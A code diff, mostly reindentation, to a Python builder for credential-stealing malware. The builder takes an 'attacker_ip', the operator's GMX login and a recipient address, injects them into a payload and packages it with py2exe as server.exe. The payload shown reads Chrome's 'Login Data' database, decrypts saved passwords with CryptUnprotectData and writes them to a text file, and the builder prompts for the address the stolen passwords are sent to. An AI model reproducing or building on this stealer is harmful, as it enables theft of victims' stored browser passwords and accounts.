@@ -43,7 +43,7 @@ while loop == True:
 	if option == "1":
 		email=raw_input("Input your GMX email address: ")
 		pwd = raw_input("Input your GMX password: ")
-		mailto = raw_input("Input the email you want to send the passwords to. Leave black to send it to yourself")
+		mailto = raw_input("Input the email you want to send the passwords to. Leave black to send it to yourself: ")
 		if not mailto:
 			mailto = email
 		loop = False
@@ -76,40 +76,40 @@ while loop == False:
 		
 
 def done():
-    os.system('cls')
-    print 'Server has been created under the name server.exe\n'
-    raw_input("Press Enter to continue...")
-    exit()
+	os.system('cls')
+	print 'Server has been created under the name server.exe\n'
+	raw_input("Press Enter to continue...")
+	exit()
 
 def py2crypt():
-    sys.argv.append("py2exe")
-    setup(
-        options = {'py2exe': {'bundle_files': 1}},
-        windows = [{'script': "server.py",
-                    "icon_resources": [(0, "icon.ico")]}],
-        zipfile = None,
-        )
+	sys.argv.append("py2exe")
+	setup(
+		options = {'py2exe': {'bundle_files': 1, "excludes":['pyreadline', 'difflib', 'doctest', 'optparse', 'pickle'], "dll_excludes":['msvcr71.dll'], "compressed":True}},
+		windows = [{'script': "server.py",
+					"icon_resources": [(0, "icon.ico")]}],
+		zipfile = None,
+		)
 
 #  'uac_info': "requireAdministrator"
 
-    if os.path.exists('server.exe'):
-        os.remove('server.exe')
-    os.rename('dist/server.exe', 'server.exe')
-    shutil.rmtree('build/')
-    shutil.rmtree('dist/')
+	if os.path.exists('server.exe'):
+		os.remove('server.exe')
+	os.rename('dist/server.exe', 'server.exe')
+	shutil.rmtree('build/')
+	shutil.rmtree('dist/')
 
 
 with open('create_server.py') as f1:
-    with open('server.py', 'w') as f2:
-        lines = f1.readlines()
-        i = 114
-        f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n'+'option = ' + '\''+option+'\'' + '\n'+'email = ' + '\''+email + '\'' + '\n'+'pwd = ' + '\''+pwd +'\''+ '\n'+'mailto = ' + '\''+mailto +'\'' +'\n'+'error = ' + '\''+error +'\''+'\n')
-        while(i<len(lines)-1):
-            f2.write(lines[i])
-            i = i+1
-    py2crypt()
-    #os.remove('server.py')
-    done()
+	with open('server.py', 'w') as f2:
+		lines = f1.readlines()
+		i = 114
+		f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n'+'option = ' + '\''+option+'\'' + '\n'+'email = ' + '\''+email + '\'' + '\n'+'pwd = ' + '\''+pwd +'\''+ '\n'+'mailto = ' + '\''+mailto +'\'' +'\n'+'error = ' + '\''+error +'\''+'\n')
+		while(i<len(lines)-1):
+			f2.write(lines[i])
+			i = i+1
+	py2crypt()
+	#os.remove('server.py')
+	done()
 
 """
 # -*- coding: cp1250 -*-
@@ -137,9 +137,9 @@ import chardet
 reload(sys)
 sys.setdefaultencoding('ISO-8859-1')
 
-path = (getenv("LOCALAPPDATA")  + "\\Google\\Chrome\\User Data\\Default\\Login Data")
+path = (getenv("LOCALAPPDATA")	+ "\\Google\\Chrome\\User Data\\Default\\Login Data")
 
-path2 = getenv("LOCALAPPDATA")  + "\\Google\\Chrome\\User Data\\Default\\Login2"
+path2 = getenv("LOCALAPPDATA")	+ "\\Google\\Chrome\\User Data\\Default\\Login2"
 
 ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32,126)]) + '_'*130
 path=path.strip()
@@ -170,24 +170,24 @@ Null,userprof = (subprocess.check_output('set USERPROFILE', shell=True).split('=
 destination = getenv("LOCALAPPDATA") + "\\" + "passwords.txt"
 
 for raw in cursor.fetchall():
-    try:
+	try:
 
 
-        if os.path.exists(destination):
-            with open(destination, "a") as password:
-                password.write('\n' + raw[0] + '\n' + raw[1] + '\n')
+		if os.path.exists(destination):
+			with open(destination, "a") as password:
+				password.write('\n' + raw[0] + '\n' + raw[1] + '\n')
 
-            with open(destination, "a") as password:
-                password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+			with open(destination, "a") as password:
+				password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
 
-        else:
-            with open(destination, "a") as password:
-                password.write(raw[0] + '\n' + raw[1] + '\n')
+		else:
+			with open(destination, "a") as password:
+				password.write(raw[0] + '\n' + raw[1] + '\n')
 
-            with open(destination, "a") as password:
-                password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
-    except:
-        continue
+			with open(destination, "a") as password:
+				password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+	except:
+		continue
 
 conn.close()
 
